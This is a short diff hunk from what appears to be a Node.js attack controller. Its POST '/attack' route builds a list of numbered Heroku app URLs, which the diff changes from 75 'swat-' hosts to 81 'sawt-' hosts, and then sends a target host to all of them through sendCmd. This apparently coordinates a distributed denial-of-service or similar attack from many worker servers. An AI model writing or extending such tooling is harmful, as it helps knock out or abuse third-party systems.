@@ -31,9 +31,9 @@ app.post('/attack',function (req,res ) {
   run = true;
 
 var list = [];
-for (var i = 1; i<75; i++)
+for (var i = 1; i<82; i++)
 {
-  list.push('https://swat-'+ i +'.herokuapp.com/');
+  list.push('https://sawt-'+ i +'.herokuapp.com/');
 }
   sendCmd(list,host);
 
